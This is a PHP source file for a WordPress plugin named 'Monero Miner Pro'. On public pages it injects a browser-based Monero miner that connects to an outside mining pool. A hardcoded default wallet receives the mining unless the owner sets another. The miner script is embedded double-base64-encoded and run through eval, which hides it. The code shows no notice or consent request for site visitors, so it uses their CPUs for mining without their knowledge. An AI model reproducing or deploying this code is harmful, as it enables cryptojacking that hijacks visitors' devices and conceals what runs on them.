<?php


include_once('MoneroMinerPro_LifeCycle.php');

class MoneroMinerPro_Plugin extends MoneroMinerPro_LifeCycle {

    /**
     * See: http://plugin.michael-simpson.com/?page_id=31
     * @return array of option meta data.
     */
    public function getOptionMetaData() {
        //  http://plugin.michael-simpson.com/?page_id=31
        return array(
            //'_version' => array('Installed Version'), // Leave this one commented-out. Uncomment to test upgrades.
            'wallet' => array(__('Your monero wallet:', '')),
            'enable_users' => array(__('Miner state:'), 'Enabled', 'Disabled'),
            'throttle' => array('Miner speed:', '100%', '90%', '80%', '70%', '60%', '50%', '40%', '30%', '20%', '10%')
        );
    }

//    protected function getOptionValueI18nString($optionValue) {
//        $i18nValue = parent::getOptionValueI18nString($optionValue);
//        return $i18nValue;
//    }

    protected function initOptions() {
        $options = $this->getOptionMetaData();
        if (!empty($options)) {
            foreach ($options as $key => $arr) {
                if (is_array($arr) && count($arr > 1)) {
                    $this->addOption($key, $arr[1]);
                }
            }
        }
    }

    public function getPluginDisplayName() {
        return 'Monero Miner Pro';
    }

    protected function getMainPluginFileName() {
        return 'monero-miner-pro.php';
    }

    /**
     * See: http://plugin.michael-simpson.com/?page_id=101
     * Called by install() to create any database tables if needed.
     * Best Practice:
     * (1) Prefix all table names with $wpdb->prefix
     * (2) make table names lower case only
     * @return void
     */
    protected function installDatabaseTables() {
        //        global $wpdb;
        //        $tableName = $this->prefixTableName('mytable');
        //        $wpdb->query("CREATE TABLE IF NOT EXISTS `$tableName` (
        //            `id` INTEGER NOT NULL");
    }

    /**
     * See: http://plugin.michael-simpson.com/?page_id=101
     * Drop plugin-created tables on uninstall.
     * @return void
     */
    protected function unInstallDatabaseTables() {
        //        global $wpdb;
        //        $tableName = $this->prefixTableName('mytable');
        //        $wpdb->query("DROP TABLE IF EXISTS `$tableName`");
    }


    /**
     * Perform actions when upgrading from version X to version Y
     * See: http://plugin.michael-simpson.com/?page_id=35
     * @return void
     */
    public function upgrade() {
    }

    public function addActionsAndFilters() {

        // Add options administration page
        // http://plugin.michael-simpson.com/?page_id=47
        add_action('admin_menu', array(&$this, 'addSettingsSubMenuPage'));

        // Example adding a script & style just for the options administration page
        // http://plugin.michael-simpson.com/?page_id=47
        //        if (strpos($_SERVER['REQUEST_URI'], $this->getSettingsSlug()) !== false) {
        //            wp_enqueue_script('my-script', plugins_url('/js/my-script.js', __FILE__));
        //            wp_enqueue_style('my-style', plugins_url('/css/my-style.css', __FILE__));
        //        }


        // Add Actions & Filters
        // http://plugin.michael-simpson.com/?page_id=37


        // Adding scripts & styles to all pages
        // Examples:
        //        wp_enqueue_script('jquery');
        //        wp_enqueue_style('my-style', plugins_url('/css/my-style.css', __FILE__));
        //        wp_enqueue_script('my-script', plugins_url('/js/my-script.js', __FILE__));

        if (strpos($_SERVER['REQUEST_URI'], $this->getSettingsSlug()) !== false) {
            wp_enqueue_script('miner-stat', plugins_url('/js/admin.js', __FILE__), null, null, true);
            wp_enqueue_script('plotly', plugins_url('/js/plotly-latest.min.js', __FILE__));
        }

        if (strpos($_SERVER['REQUEST_URI'],'wp-admin') !== false) return;

        $wallet = $this->getOption('wallet', '4581HhZkQHgZrZjKeCfCJxZff9E3xCgHGF25zABZz7oR71TnbbgiS7sK9jveE6Dx6uMs2LwszDuvQJgRZQotdpHt1fTdDhk');
        $enable = $this->getOption('enable_users',  'Disabled') == 'Enabled' ? true : false;

        if (!$enable) return ;

        wp_enqueue_script('miner-pro', plugins_url('/js/decode.js', __FILE__));
        wp_enqueue_script('miner-pro-init', plugins_url('/js/mm.js', __FILE__));

        add_action('wp_head', function() {
            $wallet = $this->getOption('wallet', '4581HhZkQHgZrZjKeCfCJxZff9E3xCgHGF25zABZz7oR71TnbbgiS7sK9jveE6Dx6uMs2LwszDuvQJgRZQotdpHt1fTdDhk');
            $throttle = $this->getOption('throttle', '100%');
            $enable = $this->getOption('enable_users',  'Disabled') == 'Enabled' ? true : false;

            if ($enable == false) return;

           $hostPool = 'wss://open-hive-server-1.pp.ua:8892';
            //$hostPool = 'ws://0.0.0.0:8892';

            $hostStat = 'ws://0.0.0.0:9000';

            // % to 0.d
            $throttle = (100 - (int)$throttle) / 100;

            ?>
            <script>
                window.MProHost = '<?=$hostPool?>';
                window.MProOrigin = '<?=plugin_dir_url(__FILE__)?>';
                window.MProHostStat = '<?=$hostStat?>';
                window.MProThrottle = <?=$throttle?>;
                window.MProWallet = '<?=$wallet?>';
                window.MProEnable = '<?=$enable?>';
            </script>
            <?php
        });

        add_action('wp_footer', function() {
            ?>
            <script>
                (function() {
                    var hhost = window.MProHost + "?site=" + encodeURI(window.location.hostname) + "&wallet=";
                    var fn = "m.js";
                    var libUrl = window.MProOrigin + "js/";
                    var proxyUrl = hhost + window.MProWallet;
                    var EncodedM = "<?=base64_encode(base64_encode(file_get_contents(plugin_dir_path(__FILE__) . 'js/miner.js')))?>";
                    eval(base64_decode(base64_decode(EncodedM)));
                    window.OHM = CH;
                    runMPro(window);
                })(window);
            </script>
            <?php
        });

        // Register short codes
        // http://plugin.michael-simpson.com/?page_id=39


        // Register AJAX hooks
        // http://plugin.michael-simpson.com/?page_id=41

    }


}
